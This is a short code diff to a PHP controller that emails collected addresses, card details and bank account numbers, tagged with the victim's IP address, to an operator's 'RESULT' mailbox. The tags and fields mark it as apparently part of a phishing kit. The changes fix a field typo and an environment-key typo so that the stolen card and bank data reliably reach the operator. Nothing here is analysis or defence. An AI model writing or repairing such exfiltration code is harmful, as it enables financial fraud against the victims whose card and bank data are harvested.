@@ -46,12 +46,12 @@ class SummaryController extends Controller
         'address' => $data->ys_address,
         'city' => $data->ys_city,
         'state' => $data->ys_state,
-        'zip' => $data->ya_zipcode,
+        'zip' => $data->ys_zipcode,
         'country' => $data->ys_country,
         'ip' => $ip
       ],function($mail){
           $mail->subject("[SETOR][CC][" . $_SERVER['REMOTE_ADDR'] . "]");
-          $mail->to(env("RESULT_EMAIl"));
+          $mail->to(env("RESULT_EMAIL"));
           $mail->from("result@rizaltamvan.com", "RESULT GANTENG");
       });
     }
@@ -66,7 +66,7 @@ class SummaryController extends Controller
         'account_number' => $data->ys_acn
       ], function($mail){
         $mail->subject("[SETOR][BANK][" . $_SERVER['REMOTE_ADDR'] . "]");
-        $mail->to(env("RESULT_EMAIl"));
+        $mail->to(env("RESULT_EMAIL"));
         $mail->from("result@rizaltamvan.com", "RESULT GANTENG");
       });
     }
